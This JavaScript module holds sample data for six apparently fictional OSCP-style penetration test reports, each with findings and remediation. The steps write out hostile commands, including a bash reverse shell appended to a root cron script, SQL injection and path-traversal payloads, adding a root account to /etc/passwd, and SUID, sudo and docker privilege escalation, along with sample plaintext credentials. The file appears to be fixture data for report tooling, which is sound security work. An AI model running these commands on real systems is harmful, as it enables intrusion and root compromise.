// 6개의 다양한 OSCP 침투 테스트 샘플 데이터

export function getSampleData(scenarioNumber = 1) {
  const scenarios = {
    1: {
      testInfo: {
        testDate: '2024-12-10',
        tester: 'Junsang Dong',
        target: '192.168.10.75',
        targetHostname: 'legacy-web.local',
        targetOS: 'Ubuntu 16.04 LTS'
      },
      findings: [
        {
          id: 1,
          title: 'Backup Configuration File Exposure',
          severity: 'High',
          category: 'Information Disclosure',
          description: 'The web server exposes a backup configuration file (config.php.bak) containing database credentials in plaintext.',
          impact: 'An attacker can obtain database credentials and potentially gain unauthorized access to the database server.',
          steps: '1. Browse to http://192.168.10.75/config.php.bak\n2. Download the file\n3. Extract credentials: webapp / W3bApp!2023#Secure',
          remediation: 'Remove all backup files from web directory. Implement proper backup procedures outside web root.',
          cvss: 7.5
        },
        {
          id: 2,
          title: 'Unrestricted File Upload',
          severity: 'Critical',
          category: 'Remote Code Execution',
          description: 'The admin upload functionality does not properly validate file types, allowing PHP code execution.',
          impact: 'An attacker can upload a PHP web shell and execute arbitrary commands with www-data privileges.',
          steps: '1. Access /admin/upload.php\n2. Upload PHP reverse shell\n3. Access at /uploads/shell.php\n4. Obtain reverse shell',
          remediation: 'Implement strict file type validation using whitelist. Store uploads outside web root.',
          cvss: 9.8
        },
        {
          id: 3,
          title: 'SUID Bash Binary',
          severity: 'Critical',
          category: 'Privilege Escalation',
          description: '/bin/bash has SUID bit set, allowing privilege escalation to root.',
          impact: 'Any user with shell access can immediately obtain root privileges.',
          steps: '1. Identify SUID bash: find / -perm -4000\n2. Execute: /bin/bash -p\n3. Verify: id shows euid=0',
          remediation: 'Remove SUID bit: chmod u-s /bin/bash. Review all SUID binaries.',
          cvss: 9.8
        }
      ]
    },
    2: {
      testInfo: {
        testDate: '2024-12-11',
        tester: 'Junsang Dong',
        target: '10.10.11.150',
        targetHostname: 'portal.corporate.local',
        targetOS: 'Windows Server 2019'
      },
      findings: [
        {
          id: 1,
          title: 'SMB Share Credential Exposure',
          severity: 'High',
          category: 'Information Disclosure',
          description: 'SMB Backups share contains credentials.txt file with plaintext passwords for multiple accounts.',
          impact: 'An attacker can obtain SQL Server, Portal Admin, and Service Account credentials leading to full system compromise.',
          steps: '1. Enumerate SMB shares: smbclient -L //10.10.11.150\n2. Access Backups share\n3. Download credentials.txt\n4. Extract: sa/SQLAdmin123!@#, admin@corporate.local/P0rtalAdmin2023!',
          remediation: 'Remove sensitive files from SMB shares. Implement proper access controls and encryption for credential storage.',
          cvss: 8.1
        },
        {
          id: 2,
          title: 'SQL Server xp_cmdshell Enabled',
          severity: 'Critical',
          category: 'Remote Code Execution',
          description: 'SQL Server has xp_cmdshell enabled, allowing command execution with SYSTEM privileges.',
          impact: 'An attacker with SQL Server access can execute commands as NT AUTHORITY\\SYSTEM.',
          steps: '1. Connect to SQL Server: mssqlclient.py sa:SQLAdmin123!@#@10.10.11.150\n2. Execute: EXEC xp_cmdshell \'whoami\'\n3. Verify SYSTEM privileges',
          remediation: 'Disable xp_cmdshell stored procedure. Use least privilege principle for SQL Server accounts.',
          cvss: 9.8
        },
        {
          id: 3,
          title: 'Kerberoasting Attack Vector',
          severity: 'High',
          category: 'Privilege Escalation',
          description: 'Service accounts with SPN are vulnerable to Kerberoasting, allowing hash extraction and offline cracking.',
          impact: 'An attacker can extract TGS tickets and crack service account passwords to gain Domain Admin access.',
          steps: '1. Enumerate SPNs: GetUserSPNs.py corporate.local/svc_backup:BackupSvc!2023\n2. Extract TGS hash\n3. Crack with hashcat\n4. Use credentials for Domain Admin access',
          remediation: 'Use strong passwords for service accounts. Implement Group Managed Service Accounts (gMSA).',
          cvss: 8.5
        }
      ]
    },
    3: {
      testInfo: {
        testDate: '2024-12-12',
        tester: 'Junsang Dong',
        target: '192.168.1.100',
        targetHostname: 'webapp.local',
        targetOS: 'Ubuntu 20.04 LTS'
      },
      findings: [
        {
          id: 1,
          title: 'SQL Injection in Login Form',
          severity: 'Critical',
          category: 'Authentication Bypass',
          description: 'Login form is vulnerable to SQL injection, allowing authentication bypass without valid credentials.',
          impact: 'An attacker can bypass authentication and gain unauthorized access to the application dashboard.',
          steps: '1. Navigate to /login.php\n2. Enter payload: username=admin\' OR \'1\'=\'1&password=anything\n3. Successfully bypass authentication\n4. Access dashboard',
          remediation: 'Use parameterized queries or prepared statements. Implement input validation and sanitization.',
          cvss: 9.8
        },
        {
          id: 2,
          title: 'Local File Inclusion (LFI)',
          severity: 'High',
          category: 'Information Disclosure',
          description: 'The view.php page is vulnerable to Local File Inclusion, allowing reading of sensitive system files.',
          impact: 'An attacker can read /etc/passwd, SSH keys, and other sensitive files leading to further compromise.',
          steps: '1. Access: http://192.168.1.100/view.php?page=../../../../etc/passwd\n2. Read SSH key: ?page=../../../../home/developer/.ssh/id_rsa\n3. Use stolen key for SSH access',
          remediation: 'Validate and sanitize file path inputs. Use whitelist approach for allowed files.',
          cvss: 7.5
        },
        {
          id: 3,
          title: 'Sudo Misconfiguration',
          severity: 'Critical',
          category: 'Privilege Escalation',
          description: 'User developer can execute /usr/bin/find with sudo without password, allowing root privilege escalation.',
          impact: 'Any user with sudo access to find command can escalate to root privileges.',
          steps: '1. Check sudo permissions: sudo -l\n2. Execute: sudo find . -exec /bin/bash \\; -quit\n3. Verify root access: id',
          remediation: 'Review sudo configurations. Remove unnecessary sudo permissions. Use principle of least privilege.',
          cvss: 9.8
        }
      ]
    },
    4: {
      testInfo: {
        testDate: '2024-12-13',
        tester: 'Junsang Dong',
        target: '192.168.20.50',
        targetHostname: 'dev-server.local',
        targetOS: 'CentOS 7'
      },
      findings: [
        {
          id: 1,
          title: 'FTP Anonymous Access',
          severity: 'Medium',
          category: 'Information Disclosure',
          description: 'FTP service allows anonymous login and contains sensitive files including passwords.txt and notes.txt.',
          impact: 'An attacker can download sensitive files containing credentials and system information.',
          steps: '1. Connect to FTP: ftp 192.168.20.50\n2. Login as anonymous\n3. Download passwords.txt and notes.txt\n4. Extract credentials',
          remediation: 'Disable anonymous FTP access. Implement proper authentication and access controls.',
          cvss: 5.3
        },
        {
          id: 2,
          title: 'Weak SSH Key Authentication',
          severity: 'High',
          category: 'Authentication Bypass',
          description: 'SSH service accepts weak RSA keys and allows root login with key-based authentication.',
          impact: 'An attacker with stolen or weak SSH key can gain direct root access to the system.',
          steps: '1. Obtain SSH private key from FTP\n2. Set permissions: chmod 600 key\n3. Connect: ssh -i key root@192.168.20.50\n4. Gain root shell',
          remediation: 'Disable root login via SSH. Use strong key pairs. Implement key rotation policies.',
          cvss: 8.1
        },
        {
          id: 3,
          title: 'Writable /etc/passwd',
          severity: 'Critical',
          category: 'Privilege Escalation',
          description: '/etc/passwd file is writable by non-root users, allowing addition of new root accounts.',
          impact: 'Any user can add a new root user to /etc/passwd and gain root privileges.',
          steps: '1. Generate password hash: openssl passwd -1 password123\n2. Add to /etc/passwd: echo \'hacker:$1$xyz$...:0:0:root:/root:/bin/bash\' >> /etc/passwd\n3. Switch user: su hacker',
          remediation: 'Fix file permissions: chmod 644 /etc/passwd. Review all system file permissions.',
          cvss: 9.8
        }
      ]
    },
    5: {
      testInfo: {
        testDate: '2024-12-14',
        tester: 'Junsang Dong',
        target: '10.0.0.25',
        targetHostname: 'api-server.local',
        targetOS: 'Debian 11'
      },
      findings: [
        {
          id: 1,
          title: 'API Key Exposure in Source Code',
          severity: 'High',
          category: 'Information Disclosure',
          description: 'Git repository exposed in web root contains API keys and database credentials in source code.',
          impact: 'An attacker can access sensitive API keys and database credentials leading to unauthorized API access.',
          steps: '1. Discover .git directory: http://10.0.0.25/.git/\n2. Clone repository: git clone http://10.0.0.25/.git/\n3. Extract API keys from config files',
          remediation: 'Remove .git directory from web root. Use environment variables for sensitive data. Implement .gitignore properly.',
          cvss: 7.5
        },
        {
          id: 2,
          title: 'Insecure Direct Object Reference (IDOR)',
          severity: 'High',
          category: 'Authorization Bypass',
          description: 'API endpoints do not properly validate user authorization, allowing access to other users\' data.',
          impact: 'An attacker can access sensitive data belonging to other users by manipulating object IDs.',
          steps: '1. Authenticate and obtain user ID: 1001\n2. Access: GET /api/users/1002/data\n3. Successfully retrieve unauthorized data',
          remediation: 'Implement proper authorization checks. Verify user ownership before data access.',
          cvss: 8.1
        },
        {
          id: 3,
          title: 'SUID Nmap Binary',
          severity: 'High',
          category: 'Privilege Escalation',
          description: '/usr/bin/nmap has SUID bit set, allowing privilege escalation through interactive mode.',
          impact: 'Any user can use nmap interactive mode to execute commands as root.',
          steps: '1. Identify SUID nmap: find / -perm -4000\n2. Execute: nmap --interactive\n3. Run: !sh (executes as root)',
          remediation: 'Remove SUID bit from nmap: chmod u-s /usr/bin/nmap. Review all SUID binaries.',
          cvss: 8.8
        }
      ]
    },
    6: {
      testInfo: {
        testDate: '2024-12-15',
        tester: 'Junsang Dong',
        target: '172.16.0.100',
        targetHostname: 'db-server.local',
        targetOS: 'Ubuntu 18.04 LTS'
      },
      findings: [
        {
          id: 1,
          title: 'MySQL Weak Root Password',
          severity: 'Critical',
          category: 'Authentication Bypass',
          description: 'MySQL root account uses weak default password, allowing unauthorized database access.',
          impact: 'An attacker can gain full access to MySQL database, potentially accessing sensitive data and executing commands.',
          steps: '1. Attempt MySQL connection: mysql -h 172.16.0.100 -u root -p\n2. Use weak password: root\n3. Successfully connect and access all databases',
          remediation: 'Change default MySQL root password. Implement strong password policy. Disable remote root login.',
          cvss: 9.1
        },
        {
          id: 2,
          title: 'Cron Job Command Injection',
          severity: 'Critical',
          category: 'Remote Code Execution',
          description: 'Cron job script does not properly sanitize input, allowing command injection as root user.',
          impact: 'An attacker can inject malicious commands into cron job, executing code as root.',
          steps: '1. Identify writable cron script: /opt/backup.sh\n2. Inject command: echo \'bash -i >& /dev/tcp/172.16.0.50/4444 0>&1\' >> /opt/backup.sh\n3. Wait for cron execution\n4. Receive root shell',
          remediation: 'Sanitize all inputs in cron scripts. Use absolute paths. Implement input validation.',
          cvss: 9.8
        },
        {
          id: 3,
          title: 'Docker Socket Exposure',
          severity: 'Critical',
          category: 'Privilege Escalation',
          description: 'Docker socket is accessible to non-root users, allowing container escape and host root access.',
          impact: 'A user with docker group access can escape containers and gain root access on the host system.',
          steps: '1. Check docker access: docker ps\n2. Mount host root: docker run -v /:/mnt -it alpine\n3. Access host filesystem and gain root',
          remediation: 'Restrict docker socket access. Remove users from docker group. Use rootless docker.',
          cvss: 9.8
        }
      ]
    }
  }

  return scenarios[scenarioNumber] || scenarios[1]
}

// 모든 샘플 데이터 목록 반환
export function getAllSampleScenarios() {
  return [
    { number: 1, name: 'Legacy Web Server', difficulty: 'Medium', target: '192.168.10.75' },
    { number: 2, name: 'Corporate Portal', difficulty: 'Hard', target: '10.10.11.150' },
    { number: 3, name: 'Multi-Step Web App', difficulty: 'Medium', target: '192.168.1.100' },
    { number: 4, name: 'Development Server', difficulty: 'Medium', target: '192.168.20.50' },
    { number: 5, name: 'API Server', difficulty: 'Hard', target: '10.0.0.25' },
    { number: 6, name: 'Database Server', difficulty: 'Hard', target: '172.16.0.100' }
  ]
}
